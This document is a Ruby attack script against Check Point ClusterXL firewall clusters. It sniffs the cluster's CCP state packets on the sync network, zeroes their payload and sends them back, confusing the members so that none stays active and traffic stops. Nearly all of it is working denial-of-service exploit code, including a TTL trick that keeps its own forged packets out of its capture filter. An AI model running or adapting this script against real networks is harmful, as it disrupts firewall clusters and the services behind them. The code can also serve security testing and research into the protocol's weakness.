#!/usr/bin/env ruby

# Sniff for CCP packets, modify them and send back
#
# Makes Check Point ClusterXL member gateways confused about peer's state which
# leads to situation where gateways are not passing traffic (none is "Active")
#
# Tested protocol version 2000 (SPLAT R75) in following modes:
# * New High Availability
# * Load Sharing (Unicast)
# * Load Sharing (Multicast)
#
# Must be run on network segment/VLAN where "Sync" or "Cluster + Sync"
# interfaces are located to have an effect
#
# Script requires CCP support file for Racket. Ruby 1.8 is preferred for
# Racket compatibility
#
# Use at your own risk. I hold no responsibility for use of this code by you
#
# by jj <jozwiack @ gmail.com>

require 'rubygems'
require 'pcaprub'
require 'racket'

include Racket

unless (ARGV.size == 1)
  puts "Usage #{$0} <iface>"
  exit
end

iface = ARGV[0]

# Prepare template packet
n = Racket::Racket.new
n.iface = iface

# Src MAC must match 00:00:00:00:magic_number:member_id pattern
# Actually member_id can be random, magic_number must match original value
# Later on src MAC will be just copied from original frame
n.l2 = L2::Ethernet.new
n.l2.ethertype = 0x0800


n.l3 = L3::IPv4.new
# Let's tag packets with different TTL so they won't get captured by filter
n.l3.ttl = 128
# CCP is encapsulated within UDP (17)
n.l3.protocol = 17

n.l4 = L4::UDP.new
n.l4.src_port = 8116
n.l4.dst_port = 8116

# Sniff for CCP packets
begin
  p = Pcap::open_live(iface, 1500, true, 1000)
  unless (iface.nil?)
    # Look for original packets with TTL = 255
    p.setfilter("ip[8] = 255 and udp and src port 8116 and dst port 8116")
  end
rescue Exception => e
  puts "Pcap exception: #{e}"
  exit
end

begin
  p.each do |pkt|
    eth = L2::Ethernet.new(pkt)
    if (eth.ethertype == 0x0800)
      ip = L3::IPv4.new(eth.payload)
      if (ip.protocol == 17)
        udp = L4::UDP.new(ip.payload)
        ccp = L5::CCP.new(udp.payload)
        # Match only "CCP Report source machine's state" packets (opcode = 1)
        if (ccp.magic == 0x1a90 and ccp.opcode == 1)
          puts "[+] Received valid \"CCP Report source machine's state packet\", let's play with it:"
          puts "  -> #{ccp.pretty}"
          # Prepare malicious CCP packet
          n.l2.src_mac = eth.src_mac
          n.l2.dst_mac = eth.dst_mac
          # Actually IPs can be random...
          n.l3.src_ip = ip.src_ip
          n.l3.dst_ip = ip.dst_ip
          n.l5 = L5::CCP.new(udp.payload)
          # Here comes the evil part
          n.l5.payload = "\x00" * n.l5.payload.length
          n.l4.payload = n.l5
          n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
          n.l4.payload = ""
          b = n.sendpacket
          puts "  -> Sent #{b} bytes back..."
        end
      end
    end
  end
rescue Interrupt
  puts "\nInterrupted by user..."
  exit
rescue Exception => e
  puts "Exception: #{e}"
  exit
end
